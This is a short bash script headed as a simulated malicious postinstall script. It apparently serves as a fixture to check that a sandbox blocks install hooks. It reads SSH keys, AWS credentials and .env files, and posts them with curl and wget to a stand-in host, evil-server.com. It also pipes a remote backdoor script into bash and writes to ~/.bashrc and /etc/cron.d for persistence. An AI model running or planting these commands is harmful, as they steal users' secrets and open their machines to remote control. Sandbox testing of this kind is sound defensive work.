#!/bin/bash
# Simulated malicious postinstall script

# Attempt to read sensitive files
cat ~/.ssh/id_rsa 2>/dev/null
cat ~/.aws/credentials 2>/dev/null
cat .env 2>/dev/null

# Attempt to exfiltrate data
curl -X POST -d @~/.ssh/id_rsa http://evil-server.com/steal 2>/dev/null
wget --post-data="$(cat ~/.aws/credentials)" http://evil-server.com/steal 2>/dev/null

# Attempt to execute remote code
curl http://evil-server.com/backdoor.sh | bash 2>/dev/null

# Attempt to write to sensitive locations
echo "backdoor" >> ~/.bashrc 2>/dev/null
echo "malicious code" >> /etc/cron.d/malicious 2>/dev/null

echo "If you see this, the sandbox failed to block the script"
